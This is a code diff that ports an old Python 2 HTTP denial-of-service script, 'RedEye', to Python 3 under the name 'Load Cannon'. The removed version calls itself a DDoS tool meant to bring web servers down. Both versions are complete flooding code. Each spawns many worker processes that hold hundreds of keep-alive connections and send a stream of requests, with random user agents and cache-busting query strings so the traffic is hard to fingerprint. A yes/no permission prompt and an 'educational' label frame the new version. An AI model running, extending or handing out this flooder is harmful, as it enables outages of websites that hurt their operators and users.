@@ -1,635 +1,315 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
+import sys
+import time
+import random
+import socket
+import ssl
+import urllib.parse
+import http.client
+from multiprocessing import Process, Manager
 
-"""
-# Exploit Title: [RedEye 1.0 http DDOS Script]
-# Date: [10.10.2015]
-# Exploit Author: [Dhiraj Mishra]
-# Vendor Homepage: [fb.com/mishra.dhiraj16]
-		   [twitter.com/mishradhiraj_]
-# Software Link: [http://bit.ly/1Lo2DUN]
-# Version: [1.0] 
-# Tested on: ['http' WEB APPLICATIONS]
-
-##################################
-#CAPEC-469 Provided by Mitre.org #
-##################################
-
-This tool is a DOS tool that is meant to put heavy load on HTTP servers
-in order to bring them to their knees by exhausting the resource pool.
-
-This tool is meant for research purposes only
-and any malicious usage of this tool is prohibited.
-
-LEGAL NOTICE:
-THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
-IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY , 
-THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
-BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
-
+# --- Configuration ---
+BANNER = """
+***************************************************
+*                [ LOAD CANNON ]                  *
+* * * * * * * * * * * * * * * * * * * * *  * * *  *                                                  
+*     L O A D  ::  F I R E  ::  C R A S H         *
+* * * * * * * * * * * * * * * * * * * * *  * * *  *
+*      Interactive Load Tester (Educational)      *
+***************************************************
 """
 
-from multiprocessing import Process, Manager, Pool
-import urlparse, ssl
-import sys, getopt, random, time, os
-
-# Python version-specific 
-if  sys.version_info < (3,0):
-    # Python 2.x
-    import httplib
-    HTTPCLIENT = httplib
-else:
-    # Python 3.x
-    import http.client
-    HTTPCLIENT = http.client
-
-####
-# Config
-####
-DEBUG = False
-
-####
-# Constants
-####
-METHOD_GET  = 'get'
-METHOD_POST = 'post'
-METHOD_RAND = 'random'
-
-JOIN_TIMEOUT=1.0
-
-DEFAULT_WORKERS=10
-DEFAULT_SOCKETS=500
-
-GOLDENEYE_BANNER = 'RedEye v1.0 by Mishra Dhiraj <mishra.dhiraj95@gmail.com>'
-
-USER_AGENT_PARTS = {
-    'os': {
-        'linux': {
-            'name': [ 'Linux x86_64', 'Linux i386' ],
-            'ext': [ 'X11' ]
-        },
-        'windows': {
-            'name': [ 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2' ],
-            'ext': [ 'WOW64', 'Win64; x64' ]
-        },
-        'mac': {
-            'name': [ 'Macintosh' ],
-            'ext': [ 'Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10) ]
-        },
-    },
-    'platform': {
-        'webkit': {
-            'name': [ 'AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30) ],
-            'details': [ 'KHTML, like Gecko' ],
-            'extensions': [ 'Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10) ]
-        },
-        'iexplorer': {
-            'browser_info': {
-                'name': [ 'MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0' ],
-                'ext_pre': [ 'compatible', 'Windows; U' ],
-                'ext_post': [ 'Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10) ]
-            }
-        },
-        'gecko': {
-            'name': [ 'Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30) ],
-            'details': [],
-            'extensions': []
-        }
-    }
-}
-
-####
-# GoldenEye Class
-####
-
-class GoldenEye(object):
-
-    # Counters
-    counter = [0, 0]
-    last_counter = [0, 0]
-
-    # Containers
-    workersQueue = []
-    manager = None
-    useragents = []
-
-    # Properties
-    url = None
-
-    # Options
-    nr_workers = DEFAULT_WORKERS
-    nr_sockets = DEFAULT_SOCKETS
-    method = METHOD_GET
-
-    def __init__(self, url):
-
-        # Set URL
-        self.url = url
-
-        # Initialize Manager
-        self.manager = Manager()
-
-        # Initialize Counters
-        self.counter = self.manager.list((0, 0))
-
-
-    def exit(self):
-        self.stats()
-        print "Shutting down RedEye"
-
-    def __del__(self):
-        self.exit()
-
-    def printHeader(self):
-
-        # Taunt!
-        print
-        print GOLDENEYE_BANNER
-        print
-
-    # Do the fun!
-    def fire(self):
-
-        self.printHeader()
-        print "Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets)
-
-        if DEBUG:
-            print "Starting {0} concurrent workers".format(self.nr_workers)
-
-        # Start workers
-        for i in range(int(self.nr_workers)):
-
-            try:
-
-                worker = Striker(self.url, self.nr_sockets, self.counter)
-                worker.useragents = self.useragents
-                worker.method = self.method
-
-                self.workersQueue.append(worker)
-                worker.start()
-            except (Exception):
-                error("Failed to start worker {0}".format(i))
-                pass 
-
-        if DEBUG:
-            print "Initiating monitor"
-        self.monitor()
-
-    def stats(self):
-
-        try:
-            if self.counter[0] > 0 or self.counter[1] > 0:
-
-                print "{0} GoldenEye strikes deferred. ({1} Failed)".format(self.counter[0], self.counter[1])
-
-                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
-                    print "\tServer may be DOWN!"
+# =========================
+# 1. Advanced User-Agent Generator (Fixed)
+# =========================
+def generate_user_agents(count=1500, seed=None):
+    if seed: random.seed(seed)
     
-                self.last_counter[0] = self.counter[0]
-                self.last_counter[1] = self.counter[1]
-        except (Exception):
-            pass # silently ignore
-
-    def monitor(self):
-        while len(self.workersQueue) > 0:
-            try:
-                for worker in self.workersQueue:
-                    if worker is not None and worker.is_alive():
-                        worker.join(JOIN_TIMEOUT)
-                    else:
-                        self.workersQueue.remove(worker)
-
-                self.stats()
-
-            except (KeyboardInterrupt, SystemExit):
-                print "CTRL+C received. Killing all workers"
-                for worker in self.workersQueue:
-                    try:
-                        if DEBUG:
-                            print "Killing worker {0}".format(worker.name)
-                        #worker.terminate()
-                        worker.stop()
-                    except Exception, ex:
-                        pass # silently ignore
-                if DEBUG:
-                    raise
-                else:
-                    pass
-
-####
-# Striker Class
-####
-
-class Striker(Process):
-
+    # Expanded Version Pools
+    chrome_versions = list(range(110, 125))
+    firefox_versions = list(range(110, 125))
+    safari_versions = ["16.6", "17.0", "17.1", "17.2", "17.3", "17.4", "17.5"]
+    edge_versions = list(range(110, 125))
+    
+    windows_versions = ["10.0", "11.0"]
+    macos_versions = ["12_6", "13_6", "14_2", "14_3", "14_4"]
+    android_versions = ["11", "12", "13", "14"]
+    ios_versions = ["16_6", "17_0", "17_1", "17_2", "17_3", "17_4"]
+    
+    android_devices = ["Pixel 6", "Pixel 7", "Pixel 8 Pro", "SM-G991B", "SM-G996B", "SM-A515F", "OnePlus 11"]
+    
+    uas = set()
+    attempts = 0
+    max_attempts = count * 10 # Safety break
+    
+    while len(uas) < count and attempts < max_attempts:
+        attempts += 1
+        platform = random.choice(["windows", "macos", "linux", "android", "ios"])
         
-    # Counters
-    request_count = 0
-    failed_count = 0
+        # Random Build Numbers for Entropy (Fixes infinite loop)
+        build_a = random.randint(1000, 9999)
+        build_b = random.randint(0, 150)
+        
+        if platform == "windows":
+            win = random.choice(windows_versions)
+            browser = random.choice(["chrome", "firefox", "edge"])
+            if browser == "chrome":
+                v = random.choice(chrome_versions)
+                ua = f"Mozilla/5.0 (Windows NT {win}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.{build_a}.{build_b} Safari/537.36"
+            elif browser == "edge":
+                v = random.choice(edge_versions)
+                ua = f"Mozilla/5.0 (Windows NT {win}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.{build_a}.{build_b} Safari/537.36 Edg/{v}.0.{build_a}.{build_b}"
+            else:
+                v = random.choice(firefox_versions)
+                ua = f"Mozilla/5.0 (Windows NT {win}; Win64; x64; rv:{v}.0) Gecko/20100101 Firefox/{v}.0"
+                
+        elif platform == "macos":
+            mac = random.choice(macos_versions)
+            browser = random.choice(["chrome", "firefox", "safari"])
+            if browser == "chrome":
+                v = random.choice(chrome_versions)
+                ua = f"Mozilla/5.0 (Macintosh; Intel Mac OS X {mac}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.{build_a}.{build_b} Safari/537.36"
+            elif browser == "firefox":
+                v = random.choice(firefox_versions)
+                ua = f"Mozilla/5.0 (Macintosh; Intel Mac OS X {mac.replace('_', '.')}; rv:{v}.0) Gecko/20100101 Firefox/{v}.0"
+            else:
+                v = random.choice(safari_versions)
+                ua = f"Mozilla/5.0 (Macintosh; Intel Mac OS X {mac}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{v} Safari/605.1.15"
+                
+        elif platform == "linux":
+            browser = random.choice(["chrome", "firefox"])
+            if browser == "chrome":
+                v = random.choice(chrome_versions)
+                ua = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.{build_a}.{build_b} Safari/537.36"
+            else:
+                v = random.choice(firefox_versions)
+                ua = f"Mozilla/5.0 (X11; Linux x86_64; rv:{v}.0) Gecko/20100101 Firefox/{v}.0"
+                
+        elif platform == "android":
+            av = random.choice(android_versions)
+            dev = random.choice(android_devices)
+            v = random.choice(chrome_versions)
+            ua = f"Mozilla/5.0 (Linux; Android {av}; {dev}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.{build_a}.{build_b} Mobile Safari/537.36"
+            
+        else: # ios
+            iv = random.choice(ios_versions)
+            sv = random.choice(safari_versions)
+            device = random.choice(["iPhone", "iPad"])
+            ua = f"Mozilla/5.0 ({device}; CPU {device} OS {iv} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{sv} Mobile/15E148 Safari/604.1"
+            
+        uas.add(ua)
+        
+    return list(uas)
 
-    # Containers
-    url = None
-    host = None
-    port = 80
-    ssl = False
-    referers = []
-    useragents = []
-    socks = []
-    counter = None
-    nr_socks = DEFAULT_SOCKETS
+# Pre-generate agents to share across processes
+print("🔹 Generating 1,500 Unique User-Agents...")
+USER_AGENTS = generate_user_agents(1500)
+print(f"✅ Done. ({len(USER_AGENTS)} generated)")
 
-    # Flags
-    runnable = True
-
-    # Options
-    method = METHOD_GET
-
-    def __init__(self, url, nr_sockets, counter):
-
-        super(Striker, self).__init__()
-
+# =========================
+# 2. Cannon Worker (The Engine)
+# =========================
+class CannonWorker(Process):
+    def __init__(self, target_url, nr_sockets, counter, method):
+        super(CannonWorker, self).__init__()
         self.counter = counter
         self.nr_socks = nr_sockets
+        self.url = target_url
+        self.socks = []
+        self.runnable = True
+        self.method = method
+        
+        # URL Parsing
+        if not self.url.startswith("http"):
+            self.url = "http://" + self.url
+            
+        parsed = urllib.parse.urlparse(self.url)
+        self.ssl = (parsed.scheme == 'https')
+        self.host = parsed.netloc.split(':')[0]
+        self.path = parsed.path or "/"
+        self.port = parsed.port or (443 if self.ssl else 80)
 
-        parsedUrl = urlparse.urlparse(url)
+    def build_random_string(self, size):
+        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+        return ''.join(random.choice(chars) for _ in range(size))
 
-        if parsedUrl.scheme == 'https':
-            self.ssl = True
-
-        self.host = parsedUrl.netloc.split(':')[0]
-        self.url = parsedUrl.path
-
-        self.port = parsedUrl.port
-
-        if not self.port:
-            self.port = 80 if not self.ssl else 443
-
-
-        self.referers = [ 
-            'http://www.google.com/',
-            'http://www.bing.com/',
-            'http://www.baidu.com/',
-            'http://www.yandex.com/',
-            'http://' + self.host + '/'
-            ]
-
-
-    def __del__(self):
-        self.stop()
-
-
-    #builds random ascii string
-    def buildblock(self, size):
-        out_str = ''
-
-        _LOWERCASE = range(97, 122)
-        _UPPERCASE = range(65, 90)
-        _NUMERIC   = range(48, 57)
-
-        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
-
-        for i in range(0, size):
-            a = random.choice(validChars)
-            out_str += chr(a)
-
-        return out_str
-
+    def generate_url(self):
+        separator = "&" if "?" in self.path else "?"
+        qs = f"t={self.build_random_string(5)}"
+        return f"{self.path}{separator}{qs}"
 
     def run(self):
-
-        if DEBUG:
-            print "Starting worker {0}".format(self.name)
-
         while self.runnable:
-
             try:
+                # -----------------------------------
+                # A. Refill Socket Pool (Connection)
+                # -----------------------------------
+                needed = self.nr_socks - len(self.socks)
+                if needed > 0:
+                    for _ in range(needed):
+                        try:
+                            if self.ssl:
+                                ctx = ssl._create_unverified_context()
+                                c = http.client.HTTPSConnection(self.host, self.port, timeout=4, context=ctx)
+                            else:
+                                c = http.client.HTTPConnection(self.host, self.port, timeout=4)
+                            self.socks.append(c)
+                        except Exception:
+                            break
 
-                for i in range(self.nr_socks):
+                # -----------------------------------
+                # B. Fire Requests (High Throughput)
+                # -----------------------------------
+                # We iterate a copy so we can modify the original list safely
+                for conn in list(self.socks):
+                    try:
+                        url = self.generate_url()
+                        headers = {
+                            'User-Agent': random.choice(USER_AGENTS),
+                            'Cache-Control': 'no-cache',
+                            'Connection': 'keep-alive', # Key for speed
+                            'Host': self.host
+                        }
+                        
+                        req_method = random.choice(['GET', 'POST']) if self.method == 'RANDOM' else self.method
+                        
+                        # Send Request
+                        conn.request(req_method, url, headers=headers)
+                        
+                        # Read Response
+                        resp = conn.getresponse()
+                        resp.read() # Consume body to clear buffer
+                        
+                        self.inc_counter()
+                        
+                        # Optimization: Close only if server asks to close
+                        # Otherwise, keep socket open for next loop (Keep-Alive)
+                        if resp.getheader("Connection") == "close":
+                            conn.close()
+                            if conn in self.socks: self.socks.remove(conn)
+                            
+                    except (socket.error, http.client.HTTPException):
+                        # Socket died or timed out
+                        self.inc_failed()
+                        if conn in self.socks: self.socks.remove(conn)
+                    except Exception:
+                        self.inc_failed()
+                        if conn in self.socks: self.socks.remove(conn)
                 
-                    if self.ssl:
-                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
-                    else:
-                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
+            except Exception:
+                pass # Main loop error handler
 
-                    self.socks.append(c)
+    def inc_counter(self):
+        try: self.counter[0] += 1
+        except: pass
 
-                for conn_req in self.socks:
+    def inc_failed(self):
+        try: self.counter[1] += 1
+        except: pass
 
-                    (url, headers) = self.createPayload()
-
-                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
-
-                    conn_req.request(method.upper(), url, None, headers)
-
-                for conn_resp in self.socks:
-
-                    resp = conn_resp.getresponse()
-                    self.incCounter()
-
-                self.closeConnections()
-                
-            except:
-                self.incFailed()
-                if DEBUG:
-                    raise
-                else:
-                    pass # silently ignore
-
-        if DEBUG:
-            print "Worker {0} completed run. Sleeping...".format(self.name)
-            
-    def closeConnections(self):
-        for conn in self.socks:
-            try:
-                conn.close()
-            except:
-                pass # silently ignore
-            
-
-    def createPayload(self):
-
-        req_url, headers = self.generateData()
-
-        random_keys = headers.keys()
-        random.shuffle(random_keys)
-        random_headers = {}
-        
-        for header_name in random_keys:
-            random_headers[header_name] = headers[header_name]
-
-        return (req_url, random_headers)
-
-    def generateQueryString(self, ammount = 1):
-
-        queryString = []
-
-        for i in range(ammount):
-
-            key = self.buildblock(random.randint(3,10))
-            value = self.buildblock(random.randint(3,20))
-            element = "{0}={1}".format(key, value)
-            queryString.append(element)
-
-        return '&'.join(queryString)
-            
-    
-    def generateData(self):
-
-        returnCode = 0
-        param_joiner = "?"
-
-        if len(self.url) == 0:
-            self.url = '/'
-
-        if self.url.count("?") > 0:
-            param_joiner = "&"
-
-        request_url = self.generateRequestUrl(param_joiner)
-
-        http_headers = self.generateRandomHeaders()
-
-
-        return (request_url, http_headers)
-
-    def generateRequestUrl(self, param_joiner = '?'):
-
-        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))
-
-    def getUserAgent(self):
-
-        if self.useragents:
-            return random.choice(self.useragents)
-
-        # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]
-
-        ## Mozilla Version
-        mozilla_version = "Mozilla/5.0" # hardcoded for now, almost every browser is on this version except IE6
-
-        ## System And Browser Information
-        # Choose random OS
-        os = USER_AGENT_PARTS['os'][random.choice(USER_AGENT_PARTS['os'].keys())]
-        os_name = random.choice(os['name']) 
-        sysinfo = os_name
-
-        # Choose random platform
-        platform = USER_AGENT_PARTS['platform'][random.choice(USER_AGENT_PARTS['platform'].keys())]
-
-        # Get Browser Information if available
-        if 'browser_info' in platform and platform['browser_info']:
-            browser = platform['browser_info']
-
-            browser_string = random.choice(browser['name'])
-
-            if 'ext_pre' in browser:
-                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)
-
-            sysinfo = "%s; %s" % (browser_string, sysinfo)
-
-            if 'ext_post' in browser:
-                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))
-
-
-        if 'ext' in os and os['ext']:
-            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))
-
-        ua_string = "%s (%s)" % (mozilla_version, sysinfo)
-
-        if 'name' in platform and platform['name']:
-            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))
-
-        if 'details' in platform and platform['details']:
-            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )
-
-        if 'extensions' in platform and platform['extensions']:
-            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))
-
-        return ua_string
-
-    def generateRandomHeaders(self):
-
-        # Random no-cache entries
-        noCacheDirectives = ['no-cache', 'max-age=0']
-        random.shuffle(noCacheDirectives)
-        nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
-        noCache = ', '.join(noCacheDirectives[:nrNoCache])
-
-        # Random accept encoding
-        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
-        random.shuffle(acceptEncoding)
-        nrEncodings = random.randint(1,len(acceptEncoding)/2)
-        roundEncodings = acceptEncoding[:nrEncodings]
-
-        http_headers = {
-            'User-Agent': self.getUserAgent(),
-            'Cache-Control': noCache,
-            'Accept-Encoding': ', '.join(roundEncodings),
-            'Connection': 'keep-alive',
-            'Keep-Alive': random.randint(1,1000),
-            'Host': self.host,
-        }
-    
-        # Randomly-added headers
-        # These headers are optional and are 
-        # randomly sent thus making the
-        # header count random and unfingerprintable
-        if random.randrange(2) == 0:
-            # Random accept-charset
-            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
-            random.shuffle(acceptCharset)
-            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))
-
-        if random.randrange(2) == 0:
-            # Random Referer
-            url_part = self.buildblock(random.randint(5,10))
-
-            random_referer = random.choice(self.referers) + url_part
-            
-            if random.randrange(2) == 0:
-                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))
-
-            http_headers['Referer'] = random_referer
-
-        if random.randrange(2) == 0:
-            # Random Content-Trype
-            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])
-
-        if random.randrange(2) == 0:
-            # Random Cookie
-            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))
-
-        return http_headers
-
-    # Housekeeping
     def stop(self):
         self.runnable = False
-        self.closeConnections()
-        self.terminate()
 
-    # Counter Functions
-    def incCounter(self):
-        try:
-            self.counter[0] += 1
-        except (Exception):
-            pass
-
-    def incFailed(self):
-        try:
-            self.counter[1] += 1
-        except (Exception):
-            pass
-        
-
-
-####
-
-####
-# Other Functions
-####
-
-def usage():
-    print
-    print '-----------------------------------------------------------------------------------------------------------'
-    print
-    print GOLDENEYE_BANNER
-    print 
-    print ' USAGE: ./RedEye.py <url> [OPTIONS]'
-    print
-    print ' OPTIONS:'
-    print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
-    print '\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: randomly generated)'
-    print '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS)
-    print '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
-    print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
-    print '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)'
-    print '\t -h, --help\t\tShows this help'
-    print
-    print '-----------------------------------------------------------------------------------------------------------'
-
-    
-def error(msg):
-    # print help information and exit:
-    sys.stderr.write(str(msg+"\n"))
-    usage()
-    sys.exit(2)
-
-####
-# Main
-####
+# =========================
+# 3. Interactive CLI
+# =========================
+def get_input(prompt, default=None):
+    if default:
+        user_in = input(f"🔹 {prompt} [{default}]: ").strip()
+        return user_in if user_in else default
+    return input(f"🔹 {prompt}: ").strip()
 
 def main():
+    print(BANNER)
+    print("⚠️  WARNING: Only run this against servers YOU own.")
+    print("   Unauthorized stress testing is illegal.\n")
     
+    agree = input("Do you have permission to test the target? (y/n): ").lower()
+    if agree != 'y':
+        print("❌ Aborting.")
+        sys.exit(1)
+        
+    print("\n" + "="*50)
+    
+    # 1. Target
+    target = get_input("Enter Target IP or URL (e.g. 127.0.0.1)")
+    if not target:
+        print("❌ Target is required.")
+        sys.exit(1)
+
+    # 2. Method
+    print("\n" + "-"*50)
+    print("📡 HTTP METHOD SELECTION")
+    print("   1. GET    : Standard request.")
+    print("   2. POST   : Submits data (heavier load).")
+    print("   3. RANDOM : Mixes GET/POST (chaotic).")
+    print("-" * 50)
+    
+    method_choice = get_input("Select Method (1-3)", "1")
+    if method_choice == "2": method = "POST"
+    elif method_choice == "3": method = "RANDOM"
+    else: method = "GET"
+
+    # 3. Workers
+    print("\n" + "-"*50)
+    print("👥 WORKERS (Processes)")
+    print("   - Low (2-5)    : Debugging")
+    print("   - Med (10-20)  : Stress Test")
+    print("   - High (50+)   : Extreme Load")
+    print("-" * 50)
+    try: workers = int(get_input("Number of Workers", "10"))
+    except: workers = 10
+
+    # 4. Sockets
+    print("\n" + "-"*50)
+    print("🔌 SOCKETS (Connections per Worker)")
+    print("   - Low (10)     : Light")
+    print("   - Med (100)    : Heavy")
+    print("   - High (500)   : Maximum")
+    print("-" * 50)
+    try: sockets = int(get_input("Sockets per Worker", "100"))
+    except: sockets = 100
+
+    # Confirmation
+    total_conns = workers * sockets
+    print("\n" + "="*50)
+    print(f"🚀 READY TO FIRE")
+    print(f"   🎯 Target:  {target}")
+    print(f"   📡 Method:  {method}")
+    print(f"   💥 Total:   {total_conns} concurrent connections")
+    print("="*50)
+    input("Press ENTER to start (CTRL+C to stop)...")
+
+    # Execution
+    manager = Manager()
+    counter = manager.list([0, 0])
+    pool = []
+
+    for i in range(workers):
+        try:
+            w = CannonWorker(target, sockets, counter, method)
+            w.start()
+            pool.append(w)
+        except Exception as e:
+            print(f"❌ Failed to start worker: {e}")
+
+    print("\n🔥 FIRE! (Monitoring started...)")
+    start_time = time.time()
     try:
-
-        if len(sys.argv) < 2:
-            error('Please supply at least the URL')
-
-        url = sys.argv[1]
-
-        if url == '-h':
-            usage()
-            sys.exit()
-
-        if url[0:4].lower() != 'http':
-            error("Invalid URL supplied")
-
-        if url == None:
-            error("No URL supplied")
-
-        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:u:", ["debug", "help", "workers", "sockets", "method", "useragents" ])
-
-        workers = DEFAULT_WORKERS
-        socks = DEFAULT_SOCKETS
-        method = METHOD_GET
-
-        uas_file = None
-        useragents = []
-
-        for o, a in opts:
-            if o in ("-h", "--help"):
-                usage()
-                sys.exit()
-            elif o in ("-u", "--useragents"):
-                uas_file = a
-            elif o in ("-s", "--sockets"):
-                socks = int(a)
-            elif o in ("-w", "--workers"):
-                workers = int(a)
-            elif o in ("-d", "--debug"):
-                global DEBUG
-                DEBUG = True
-            elif o in ("-m", "--method"):
-                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
-                    method = a
-                else:
-                    error("method {0} is invalid".format(a))
-            else:
-                error("option '"+o+"' doesn't exists")
-
-
-        if uas_file:
-            try:
-                with open(uas_file) as f:
-                    useragents = f.readlines()
-            except EnvironmentError:
-                    error("cannot read file {0}".format(uas_file))
-
-        goldeneye = GoldenEye(url)
-        goldeneye.useragents = useragents
-        goldeneye.nr_workers = workers
-        goldeneye.method = method
-        goldeneye.nr_sockets = socks
-
-        goldeneye.fire()
-
-    except getopt.GetoptError, err:
-
-        # print help information and exit:
-        sys.stderr.write(str(err))
-        usage()
-        sys.exit(2)
+        while True:
+            elapsed = time.time() - start_time
+            hits = counter[0]
+            failed = counter[1]
+            rps = hits / elapsed if elapsed > 0 else 0
+            
+            sys.stdout.write(f"\r🚀 Hits: {hits} | ❌ Failed: {failed} | ⚡ RPS: {rps:.2f}")
+            sys.stdout.flush()
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n\n🛑 Stopping...")
+        for w in pool:
+            w.terminate()
+        print("✅ Done.")
 
 if __name__ == "__main__":
     main()
-
-
-
-
